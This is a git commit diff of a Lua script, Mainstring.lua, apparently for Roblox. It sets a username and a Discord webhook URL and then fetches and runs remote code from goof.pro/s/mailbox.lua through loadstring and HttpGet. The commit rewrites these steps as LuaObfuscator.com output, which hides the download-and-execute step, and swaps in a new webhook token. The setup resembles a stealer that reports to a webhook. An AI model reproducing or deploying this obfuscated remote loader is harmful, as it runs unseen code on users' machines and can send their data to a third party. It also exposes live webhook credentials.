8ad726b3000c5fe44be0d0b6e00a29dc860de5d3
TakTySiKokot <135499276+TakTySiKokot@users.noreply.github.com>
2023-10-26 17:55:29 +0200

    Mainstring.lua

--- Mainstring.lua
+++ Mainstring.lua
@@ -1,4 +1,12 @@
-UserName = "HejVajcoCoRobis"
-WebHook = "https://discord.com/api/webhooks/1127315957497462784/PURp8OProhSrHnA-exQ_W1Cypxj9wUiPevmje4HTms1eoaDYHSzLPQ_vr2zWkrqjt5Y4"
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 
 
-loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))()
+]]--
+
+do local v0=0;local v1;local v0;while true do if (v0==1) then while true do if (v1==0) then v0=0;while true do if (v0==1) then loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua",true))();break;end if (v0==0) then local v2=0;while true do if (v2==0) then local v3=0;while true do if (v3==1) then v2=1;break;end if (v3==0) then UserName="HejVajcoCoRobis";WebHook="https://discord.com/api/webhooks/1166804355530371163/62fUMsy1pP_45At49PT3PwDgNv9Ybds1hScrRpfNI5gLutdZuSh6lrbQA3ZU89FHoVzx";v3=1;end end end if (v2==1) then v0=1;break;end end end end break;end end break;end if (v0==0) then v1=0;v0=nil;v0=1;end end end
